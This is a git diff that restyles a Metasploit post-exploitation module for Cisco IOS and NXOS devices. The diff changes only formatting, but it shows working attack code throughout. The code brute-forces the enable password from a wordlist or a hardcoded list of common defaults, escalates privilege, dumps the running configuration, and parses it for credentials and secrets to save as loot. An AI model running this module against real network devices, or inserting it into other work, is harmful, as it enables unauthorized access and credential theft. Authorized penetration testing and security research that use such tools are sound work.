@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,24 +10,23 @@ require 'msf/core/auxiliary/cisco'
 
 class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Cisco
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Cisco Gather Device General Information',
-      'Description'   => %q{
-        This module collects a Cisco IOS or NXOS device information and configuration.
-        },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-      'Platform'      => [ 'cisco'],
-      'SessionTypes'  => [ 'shell' ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Cisco Gather Device General Information',
+                      'Description'   => %q(
+                        This module collects a Cisco IOS or NXOS device information and configuration.
+                        ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+                      'Platform'      => [ 'cisco'],
+                      'SessionTypes'  => [ 'shell' ]))
 
     register_options(
       [
         OptString.new('ENABLE', [ false, 'Enable password for changing privilege level.']),
         OptPath.new('WORDLIST', [false, 'Wordlist of possible enable passwords to try.'])
-      ], self.class)
-
+      ], self.class
+    )
   end
 
   def run
@@ -40,13 +40,12 @@ class MetasploitModule < Msf::Post
     print_status("Getting version information")
     show_ver_cmd = "show version"
     ver_out = session.shell_command(show_ver_cmd)
-    ver = ver_out.gsub(/show version/,"")
-
+    ver = ver_out.gsub(/show version/, "")
 
     # Get current privilege level
     print_status("Getting privilege level")
     priv_cmd = "show priv"
-    priv = (session.shell_command(priv_cmd)).scan(/privilege level is (\d*)/).join
+    priv = session.shell_command(priv_cmd).scan(/privilege level is (\d*)/).join
 
     # Check if this is a Nexus or IOS box
     case ver
@@ -74,18 +73,18 @@ class MetasploitModule < Msf::Post
     case os_type
     when /IOS/
       ver_loc = store_loot("cisco.ios.version",
-        "text/plain",
-        session,
-        ver.strip,
-        "version.txt",
-        "Cisco IOS Version")
+                           "text/plain",
+                           session,
+                           ver.strip,
+                           "version.txt",
+                           "Cisco IOS Version")
     when /Nexus/
       ver_loc = store_loot("cisco.nxos.version",
-        "text/plain",
-        session,
-        ver.strip,
-        "version.txt",
-        "Cisco NXOS Version")
+                           "text/plain",
+                           session,
+                           ver.strip,
+                           "version.txt",
+                           "Cisco NXOS Version")
     end
 
     # Print the version of VERBOSE set to true.
@@ -95,16 +94,14 @@ class MetasploitModule < Msf::Post
     case priv
     when "1"
       enum_exec(prompt)
-      if get_enable(datastore['ENABLE'],datastore['WORDLIST'])
-        enum_priv(prompt)
-      end
+      enum_priv(prompt) if get_enable(datastore['ENABLE'], datastore['WORDLIST'])
     when /7|15/
       enum_exec(prompt)
       enum_priv(prompt)
     end
   end
 
-  def get_enable(enable_pass,pass_file)
+  def get_enable(enable_pass, pass_file)
     if enable_pass
       found = false
       en_out = session.shell_command("enable").to_s.strip
@@ -116,13 +113,13 @@ class MetasploitModule < Msf::Post
       end
     else
       if pass_file
-        if not ::File.exist?(pass_file)
+        unless ::File.exist?(pass_file)
           print_error("Wordlist File #{pass_file} does not exists!")
           return
         end
         creds = ::File.open(pass_file, "rb")
       else
-        creds = "Cisco\n" << "cisco\n"<< "sanfran\n" << "SanFran\n" << "password\n" << "Password\n"
+        creds = "Cisco\n" << "cisco\n" << "sanfran\n" << "SanFran\n" << "password\n" << "Password\n"
       end
       print_status("Trying to get higher privilege level with common Enable passwords..")
 
@@ -130,8 +127,8 @@ class MetasploitModule < Msf::Post
       en_out = session.shell_command("enable").to_s.strip
       if en_out =~ /Password:/
         creds.each_line do |p|
-          next if p.strip.length < 1
-          next if p[0,1] == "#"
+          next if p.strip.empty?
+          next if p[0, 1] == "#"
           print_status("\tTrying password #{p.strip}")
           pass_out = session.shell_command(p.strip).to_s.strip
           vprint_status("Response: #{pass_out}")
@@ -154,7 +151,8 @@ class MetasploitModule < Msf::Post
 
   # Run enumeration commands for when privilege level is 7 or 15
   def enum_priv(prompt)
-    host,port = session.session_host, session.session_port
+    host = session.session_host
+    port = session.session_port
     priv_commands = [
       {
         "cmd"  => "show run",
@@ -173,20 +171,20 @@ class MetasploitModule < Msf::Post
       }
     ]
     priv_commands.each do |ec|
-      cmd_out = session.shell_command(ec['cmd']).gsub(/#{ec['cmd']}|#{prompt}/,"")
+      cmd_out = session.shell_command(ec['cmd']).gsub(/#{ec['cmd']}|#{prompt}/, "")
       next if cmd_out =~ /Invalid input|%/
       print_status("Gathering info from #{ec['cmd']}")
       # Process configuration
-      if ec['cmd'] =~/show run/
+      if ec['cmd'] =~ /show run/
         print_status("Parsing running configuration for credentials and secrets...")
-        cisco_ios_config_eater(host,port,cmd_out)
+        cisco_ios_config_eater(host, port, cmd_out)
       end
       cmd_loc = store_loot("cisco.ios.#{ec['fn']}",
-        "text/plain",
-        session,
-        cmd_out.strip,
-        "#{ec['fn']}.txt",
-        ec['desc'])
+                           "text/plain",
+                           session,
+                           cmd_out.strip,
+                           "#{ec['fn']}.txt",
+                           ec['desc'])
       vprint_status("Saving to #{cmd_loc}")
     end
   end
@@ -218,17 +216,18 @@ class MetasploitModule < Msf::Post
         "cmd"  => "show inventory",
         "fn"   => "hw_inventory",
         "desc" => "Hardware component inventory for Cisco Device"
-      }]
+      }
+    ]
     exec_commands.each do |ec|
-      cmd_out = session.shell_command(ec['cmd']).gsub(/#{ec['cmd']}|#{prompt}/,"")
+      cmd_out = session.shell_command(ec['cmd']).gsub(/#{ec['cmd']}|#{prompt}/, "")
       next if cmd_out =~ /Invalid input|%/
       print_status("Gathering info from #{ec['cmd']}")
       cmd_loc = store_loot("cisco.ios.#{ec['fn']}",
-        "text/plain",
-        session,
-        cmd_out.strip,
-        "#{ec['fn']}.txt",
-        ec['desc'])
+                           "text/plain",
+                           session,
+                           cmd_out.strip,
+                           "#{ec['fn']}.txt",
+                           ec['desc'])
       vprint_status("Saving to #{cmd_loc}")
     end
   end
